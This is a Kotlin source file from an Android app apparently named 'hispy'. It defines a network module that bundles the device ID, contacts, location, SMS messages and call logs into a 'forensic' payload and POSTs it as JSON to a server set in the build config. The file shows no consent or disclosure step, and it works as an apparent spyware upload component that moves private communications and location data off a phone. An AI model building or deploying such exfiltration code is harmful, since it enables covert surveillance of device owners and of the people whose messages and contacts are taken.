package com.ufc.hispy.network

import android.content.Context
import com.ufc.hispy.BuildConfig
import com.ufc.hispy.collectors.*
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

data class ForensicPayload(
    val deviceId: String,
    val timestamp: Long,
    val contacts: List<Contact>?,
    val location: LocationData?,
    val smsMessages: List<SMSMessage>?,
    val callLogs: List<CallLogEntry>?
)

class NetworkManager(private val context: Context) {
    
    private val client = OkHttpClient()
    private val gson = Gson()
    
    suspend fun sendForensicData(
        contacts: List<Contact>,
        location: LocationData?,
        smsMessages: List<SMSMessage>,
        callLogs: List<CallLogEntry>
    ) = withContext(Dispatchers.IO) {
        try {
            val payload = ForensicPayload(
                deviceId = android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID
                ),
                timestamp = System.currentTimeMillis(),
                contacts = contacts,
                location = location,
                smsMessages = smsMessages,
                callLogs = callLogs
            )
            
            val json = gson.toJson(payload)
            val body = json.toRequestBody("application/json".toMediaType())
            
            val request = Request.Builder()
                .url("${BuildConfig.SERVER_URL}/api/forensic/submit")
                .post(body)
                .build()
            
            val response = client.newCall(request).execute()
            println("Dados enviados: ${response.code}")
            
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}